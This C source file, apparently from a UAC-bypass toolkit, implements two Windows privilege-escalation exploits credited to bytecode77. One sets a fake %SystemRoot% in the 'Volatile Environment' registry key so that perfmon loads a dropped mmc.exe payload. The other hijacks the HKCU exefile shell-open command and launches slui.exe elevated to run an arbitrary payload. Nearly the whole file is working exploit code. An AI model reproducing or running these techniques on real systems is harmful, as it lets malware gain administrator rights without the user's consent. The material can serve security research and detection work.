/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2018
*
*  TITLE:       BYTECODE77.C
*
*  VERSION:     2.87
*
*  DATE:        19 Jan 2018
*
*  bytecode77 autoelevation methods.
*
*  For description please visit original URL
*
* https://bytecode77.com/hacking/exploits/uac-bypass/performance-monitor-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/sysprep-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/remote-assistance-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/display-languages-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/component-services-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/enter-product-key-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/taskmgr-privilege-escalation
* https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMethodVolatileEnv
*
* Purpose:
*
* Bypass UAC using self defined %SystemRoot% environment variable in "Volatile Environment" registry key.
*
* Fixed in Windows 10 RS3
*
*/
BOOL ucmMethodVolatileEnv(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL  bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
    WCHAR szBuffer[MAX_PATH * 2];

    do {

        //
        // Replace default Fubuki dll entry point with new and remove dll flag.
        //
        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
            break;

        //
        // Create %temp%\KureND directory.
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szTempDirectory);
        _strcat(szBuffer, T_KUREND);

        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Set controlled environment variable.
        //
        bEnvSet = supSetEnvVariable(FALSE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT_VAR,
            szBuffer);

        if (!bEnvSet)
            break;

        //
        // Create %temp%\KureND\system32 directory.
        //
        _strcat(szBuffer, SYSTEM32_DIR);
        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Drop payload to %temp%\system32 as mmc.exe and run target with wait.
        //
        _strcat(szBuffer, MMC_EXE);
        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
            bResult = supRunProcess(PERFMON_EXE, NULL);
        }

    } while (bCond);

    //
    // Cleanup if requested.
    //
    if (bEnvSet)
        supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT_VAR, NULL);

    return bResult;
}

/*
* ucmMethodSluiHijack
*
* Purpose:
*
* Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and SLUI elevated launch.
*
*/
BOOL ucmMethodSluiHijack(
    _In_ LPWSTR lpszPayload
)
{
    BOOL bResult = FALSE;
    HKEY hKey = NULL;
    LRESULT lResult;
    SIZE_T sz = 0;
    DWORD cbData = 0;
    WCHAR szBuffer[MAX_PATH * 2];

    SHELLEXECUTEINFO shinfo;

#ifndef _WIN64
    PVOID   OldValue = NULL;
#endif

#ifndef _WIN64
    if (g_ctx.IsWow64) {
        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
            return FALSE;
    }
#endif

     //
     // Create or open target key.
     //
    _strcpy(szBuffer, T_EXEFILE_SHELL);
    _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
        REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

    if (lResult == ERROR_SUCCESS) {

        //
        // Set "Default" value as our payload.
        //
        sz = _strlen(lpszPayload);
        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));

        lResult = RegSetValueEx(
            hKey,
            TEXT(""),
            0, REG_SZ,
            (BYTE*)lpszPayload,
            cbData);

        if (lResult == ERROR_SUCCESS) {

            //
            // Run trigger application.
            //
            _strcpy(szBuffer, g_ctx.szSystemDirectory);
            _strcat(szBuffer, SLUI_EXE);

            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
            shinfo.cbSize = sizeof(shinfo);
            shinfo.lpVerb = RUNAS_VERB;
            shinfo.lpFile = szBuffer;
            shinfo.nShow = SW_SHOWNORMAL;
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            bResult = ShellExecuteEx(&shinfo);
            if (bResult) {
                Sleep(5000);
                TerminateProcess(shinfo.hProcess, 0);
                CloseHandle(shinfo.hProcess);
            }
            RegDeleteValue(hKey, TEXT(""));
        }
        RegFlushKey(hKey);
        RegCloseKey(hKey);
    }

#ifndef _WIN64
    if (g_ctx.IsWow64) {
        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
    }
#endif

    return bResult;
}
